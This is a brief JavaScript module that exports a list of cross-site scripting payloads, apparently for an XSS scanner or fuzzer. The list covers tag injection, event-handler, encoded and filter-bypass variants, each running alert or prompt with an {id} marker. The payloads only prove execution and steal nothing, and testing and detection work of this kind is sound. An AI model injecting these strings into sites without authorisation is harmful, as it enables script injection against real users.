const payload = [
    '<img src=x onerror=alert({id})>',
    '<script>alert({id})</script>',
    '"><img src=x onerror=alert({id})>',
    '" onload=alert({id})',
    "\"><img src=x onerror=alert({id})>",
    "</script><svg/onload=alert({id})>",
    "<body onload=alert({id})>",
    "<svg onload=alert`{id}`>",
    "<svg onload=alert&lpar;{id}&rpar;>",
    "<svg onload=alert&#x28;{id}&#x29>",
    "<svg onload=alert&#40;{id}&#41>",
    "--!><svg/onload=prompt({id})",
    "--><script>alert({id})</script>",
    "&lt;script&gt;alert(&#39;{id}&#39;);&lt;/script&gt;",
    "< / script >< script >alert({id})< / script >",
    "<sc<script>ript>alert({id})</sc</script>ript>",
    "<script\\x20type=\"text/javascript\">javascript:alert({id});</script>",
    "'`\"><\\x3Cscript>javascript:alert({id})</script>",
    "<<SCRIPT>alert(\"{id}\");//<</SCRIPT>",
    "<script>alert(1)</script>",
];

module.exports = { payload };